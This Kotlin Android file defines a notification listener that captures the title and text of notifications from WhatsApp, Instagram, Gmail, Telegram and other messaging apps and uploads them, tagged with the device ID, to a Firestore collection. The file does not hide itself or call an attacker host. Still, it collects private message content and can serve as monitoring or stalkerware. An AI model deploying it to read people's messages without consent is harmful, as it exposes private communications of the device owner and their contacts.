package com.example.sync

import android.app.Notification
import android.content.pm.PackageManager
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import java.util.Date

class PhoneSyncNotificationListener : NotificationListenerService() {

    private val firestore = FirebaseFirestore.getInstance()
    private val deviceId by lazy {
        android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
    }

    // Apps jinki notifications sync karni hain
    private val watchedApps = setOf(
        "com.whatsapp",
        "com.instagram.android",
        "com.google.android.gm",
        "com.facebook.katana",
        "com.twitter.android",
        "com.snapchat.android",
        "org.telegram.messenger"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        if (packageName !in watchedApps) return

        val extras = sbn.notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

        if (title.isEmpty() && text.isEmpty()) return

        val appName = try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(packageName, 0)
            ).toString()
        } catch (e: PackageManager.NameNotFoundException) {
            packageName
        }

        val event = hashMapOf(
            "deviceId" to deviceId,
            "kind" to "notification",
            "changeType" to "ADDED",
            "appPackage" to packageName,
            "appName" to appName,
            "title" to title,
            "text" to text,
            "timestamp" to Date().time,
            "summary" to "[$appName] $title: $text"
        )

        firestore.collection("activity_events")
            .add(event)
            .addOnSuccessListener {
                Log.d("NotificationListener", "Notification synced: $appName")
            }
            .addOnFailureListener { e ->
                Log.e("NotificationListener", "Failed to sync notification", e)
            }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Optional: dismissed notifications bhi track kar sakte hain
    }
}
